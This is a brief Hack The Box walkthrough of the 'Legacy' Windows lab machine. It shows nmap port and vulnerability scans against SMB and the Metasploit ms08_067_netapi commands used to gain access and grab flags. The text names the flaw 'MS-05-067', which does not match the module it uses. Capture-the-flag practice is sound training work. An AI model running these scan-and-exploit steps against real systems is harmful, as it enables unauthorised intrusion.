# Hack the box - Legacy

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/windows.png"> </span><b>Windows</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.4</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2017 Mar 15</b>

___

## Port scanning
```
nmap -Pn -sC -sV -T4 -p- -oA nmap 10.10.10.4
```
![Nmap results](./nmap.png)

There is SMB service running on the host with port 445. It could be vulnerable, so let's check for nmap scripts:

```
nmap -p 445 --script vuln 10.10.10.4 -Pn
```

![Nmap vulnerability testing](nmap_vulnerability_testing.png)

Machine is vulnerable to MS-05-067.

## Getting access

Let's use metasploit, since this is most likely to have old vulnerability exploits built in:

```
use exploit/windows/smb/ms08_067_netapi
set rhosts 10.10.10.4
exploit
```

![Metasploit exploitation](exploit.png)

We can see that exploit completed successfully, so we can investigate further for user permission and flags:

![Getting flags](get_flags.png)